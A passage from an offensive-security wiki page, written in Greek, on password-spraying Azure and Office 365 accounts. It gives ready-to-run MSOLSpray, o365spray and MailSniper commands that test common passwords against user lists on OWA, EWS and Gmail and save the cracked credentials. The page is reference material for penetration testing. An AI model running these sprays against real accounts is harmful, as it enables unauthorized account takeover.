# Az - Password Spraying

{{#include ../../../banners/hacktricks-training.md}}

## Password Spray

Στο **Azure**, αυτό μπορεί να γίνει κατά **διαφορετικών API endpoints** όπως το Azure AD Graph, Microsoft Graph, Office 365 Reporting webservice, κ.λπ.

Ωστόσο, σημειώστε ότι αυτή η τεχνική είναι **πολύ θορυβώδης** και η Blue Team μπορεί να **την πιάσει εύκολα**. Επιπλέον, η **αναγκαστική πολυπλοκότητα κωδικών πρόσβασης** και η χρήση του **MFA** μπορούν να κάνουν αυτή την τεχνική κάπως άχρηστη.

Μπορείτε να εκτελέσετε μια επίθεση password spray με [**MSOLSpray**](https://github.com/dafthack/MSOLSpray)
```powershell
. .\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\validemails.txt -Password Welcome2022! -Verbose
```
Ή με το [**o365spray**](https://github.com/0xZDH/o365spray)
```bash
python3 o365spray.py --spray -U validemails.txt -p 'Welcome2022!' --count 1 --lockout 1 --domain victim.com
```
Ή με [**MailSniper**](https://github.com/dafthack/MailSniper)
```powershell
#OWA
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
#EWS
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
#Gmail
Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
```
{{#include ../../../banners/hacktricks-training.md}}
